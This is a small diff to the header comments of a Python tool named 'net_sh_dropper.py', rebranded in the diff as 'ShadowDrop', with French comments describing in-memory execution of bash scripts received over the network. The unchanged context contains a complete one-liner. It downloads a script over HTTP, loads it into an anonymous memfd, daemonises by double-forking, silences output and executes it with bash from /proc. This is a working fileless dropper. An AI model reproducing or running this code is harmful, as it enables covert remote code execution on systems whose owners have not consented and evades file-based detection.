@@ -3,7 +3,7 @@
 # python3 -c 'import os,ctypes,urllib.request as r;L=ctypes.CDLL("libc.so.6");p=r.urlopen("http://127.0.0.1/script.sh").read();f=L.memfd_create(b"k",0);os.write(f,p);[os._exit(0) for _ in range(2) if os.fork()>0];os.setsid();[os.dup2(os.open(os.devnull,2),i) for i in(0,1,2)];os.execv("/usr/bin/bash",["bash",f"/proc/self/fd/{f}"])'
 #
 # =============================================================================
-# net_sh_dropper.py — Exécution en mémoire de scripts bash reçus via le réseau
+# ShadowDrop (net_sh_dropper.py) — Exécution en mémoire de scripts bash reçus via le réseau
 # Usage : python3 net_sh_dropper.py
 # =============================================================================
 # Technique :
